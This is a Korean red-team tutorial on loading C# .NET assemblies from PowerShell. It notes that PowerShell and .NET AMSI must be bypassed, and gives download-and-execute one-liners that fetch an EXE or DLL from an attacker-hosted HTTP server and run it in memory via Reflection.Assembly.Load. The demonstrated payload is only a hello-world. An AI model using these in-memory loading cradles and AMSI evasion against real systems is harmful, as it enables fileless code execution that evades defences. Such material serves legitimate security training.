# C# 실행

C#과 파워쉘은 둘 다 닷넷 (프레임워크)를 기반으로 만들어졌기 때문에 C#에서 파워쉘을 불러오는 것도 가능하고, 파워쉘에서 C#을 불러오는 것도 가능하다. C# 뿐만 아니라 닷넷 프레임워크를 사용하는 boolang, iron-python, iron-ruby 등도 가능하다. 파워쉘에서 C#을 불러온 뒤, 그 C# 이 파워쉘을 실행하는 것도 가능하다.&#x20;

### 주의사항&#x20;

파워쉘 AMSI 뿐만 아니라 타겟 호스트가 .NET 4.8 이상의 닷넷 (프레임워크) 버전을 갖고 있다면 .NET AMSI 또한 우회해야한다. 이는 닷넷 어셈블리 내에서 인메모리 함수 패치등을 이용하면 된다.&#x20;

### 실습&#x20;

파워쉘에서 C#으로 만든 닷넷 어셈블리를 불러와보자. 일단 C# 코드를 컴파일 한 뒤, 이 어셈블리를 파이썬을 이용해 호스팅 한다.&#x20;

```
using System;

namespace test
{
    public class test
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[+] hello, from C#!");
        }
    }
}

===============================

ps> python -m http.server 8443
```

유의해야 할 점은 클래스와 함수 모두 `public` 엑세스 제한을 가지고 있어야한다는 것이다.&#x20;

이제 이 닷넷 어셈블리를 다운 받고, 불러온 뒤, 실행시킨다.&#x20;

```
$a = (New-Object net.webclient).DownloadData('http://192.168.40.179:8443/test.exe')
$b = [System.Reflection.Assembly]::Load($a)
[test.test]::Main("")

[+] hello, from C#!
```

이를 원라이너로 만들 수도 있다.&#x20;

```
[System.Reflection.Assembly]::Load((New-Object net.webclient).DownloadData('http://192.168.40.179:8443/test.exe')) | Out-Null; [<NameSpace>.<Class>]::Main("")

[+] hello, from C#!
```



\---&#x20;

DLL을 만든 뒤 실행하는 것도 가능하다. 유의할 점은 실행할 함수가 `static` 이여야한다.&#x20;

```
using System;

namespace test
{
    public class test
    {
        public static void Execute()
        {
            Console.WriteLine("[+] hello, from C#!");
        }
    } 
}

==========

[System.Reflection.Assembly]::Load((New-Object net.webclient).DownloadData('http://192.168.40.179:8443/test.dll')) | Out-Null; [test.test]::Execute()

[+] hello, from C#!
```
